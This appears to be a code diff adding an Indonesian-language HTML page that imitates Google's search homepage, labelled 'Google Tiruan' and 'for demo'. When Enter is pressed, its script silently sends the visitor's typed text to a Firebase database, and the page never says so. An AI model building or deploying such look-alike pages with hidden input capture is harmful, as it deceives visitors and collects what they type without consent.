@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Google Tiruan</title>
+    <meta name="theme-color" content="#ffffff">
+    <link rel="apple-touch-icon" href="path/to/icon.png">
+
+    <link rel="manifest" href="manifest.json">
+    <link rel="apple-touch-icon" href="apple-touch-icon.png">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .logo img {
+            width: 272px;
+            max-width: 100%;
+            height: auto;
+        }
+
+        .search-box {
+            margin-top: 20px;
+            width: 100%;
+            max-width: 600px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .search-box input[type="text"] {
+            width: 100%;
+            padding: 14px 20px;
+            font-size: 18px;
+            border: 1px solid #dfe1e5;
+            border-radius: 24px;
+            outline: none;
+            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
+            margin-bottom: 20px;
+            -webkit-appearance: none;
+        }
+
+        .buttons {
+            margin-top: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .buttons input {
+            background-color: #f8f9fa;
+            border: 1px solid #f8f9fa;
+            padding: 12px 25px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            min-width: 120px;
+            -webkit-appearance: none;
+        }
+
+        .kirim-button {
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            border-radius: 24px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 200px;
+            -webkit-appearance: none;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        @media (max-width: 500px) {
+            .logo img {
+                width: 200px;
+            }
+
+            .search-box input[type="text"] {
+                padding: 18px 25px;
+                font-size: 20px;
+            }
+
+            .buttons input {
+                padding: 14px 30px;
+                font-size: 18px;
+            }
+
+            .kirim-button {
+                padding: 16px 30px;
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+                alt="Google Logo">
+        </div>
+
+        <div class="search-box">
+            <input type="text" id="inputText" placeholder="Telusuri Google atau ketik URL">
+            <div class="buttons">
+                <input type="button" value="Google Search">
+                <input type="button" value="I'm Feeling Lucky">
+            </div>
+        </div>
+
+    </div>
+
+    <div class="footer">
+        © 2025 Google Tiruan — untuk keperluan demo
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCEmMaofxL1_ciX0wQn2X9DRM_WZFP-q9M",
+            authDomain: "magic--control.firebaseapp.com",
+            databaseURL: "https://magic--control-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "magic--control",
+            storageBucket: "magic--control.firebasestorage.app",
+            messagingSenderId: "1040027506886",
+            appId: "1:1040027506886:web:e70e085b3d57f0e765dfc7",
+            measurementId: "G-0KSWHKL03D"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function kirimKeFirebase() {
+            const teks = document.getElementById('inputText').value;
+            db.ref("pesan").set({
+                isi: teks,
+                timestamp: Date.now()
+            });
+        }
+
+        document.getElementById("inputText").addEventListener("keydown", function (event) {
+            if (event.key === "Enter") {
+                event.preventDefault();
+                kirimKeFirebase();
+            }
+        });
+
+
+        document.getElementById("inputText").addEventListener("keydown", function (event) {
+            if (event.key === "Enter") {
+                event.preventDefault();
+                kirimKeFirebase();
+            }
+        });
+
+    </script>
+</body>
+
+</html>
